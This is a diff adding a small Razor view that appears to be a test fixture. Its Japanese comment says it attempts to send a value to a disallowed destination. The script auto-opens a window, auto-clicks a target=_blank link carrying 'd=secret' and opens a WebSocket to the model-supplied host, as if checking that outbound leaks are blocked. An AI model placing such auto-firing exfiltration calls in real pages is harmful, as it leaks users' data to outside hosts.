@@ -1,0 +1,11 @@
+@model EdgeModel
+@* 別のウィンドウ・リンク(target=_blank)・WebSocket で、許可していない宛先へ値を送ろうとする画面(@Model.Text が宛先) *@
+<p>持ち出しの試み</p>
+<a id="a" target="_blank" href="@(Model.Text)/a?d=secret">リンク</a>
+@section Scripts {
+    <script>
+        window.open("@(Model.Text)/open?d=secret");
+        document.getElementById("a").click();
+        try { new WebSocket("@(Model.Text.Replace("http://", "ws://"))/ws"); } catch (e) { }
+    </script>
+}
